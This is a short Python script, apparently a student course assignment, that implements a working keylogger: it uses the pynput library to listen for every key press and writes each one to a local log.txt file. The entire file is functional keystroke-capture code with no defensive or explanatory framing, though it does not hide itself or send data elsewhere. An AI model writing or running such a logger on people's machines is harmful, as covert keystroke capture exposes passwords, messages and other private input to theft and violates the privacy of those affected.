#Super simple keyloger in python
#by: William Cornell For:SAT3812
from pynput.keyboard import Key, Listener
import logging
logging.basicConfig(filename=("log.txt"), level=logging.DEBUG, format="%(message)s")
def whentype(key):
    logging.info(str(key))
with Listener(on_press=whentype) as listener :
    listener.join()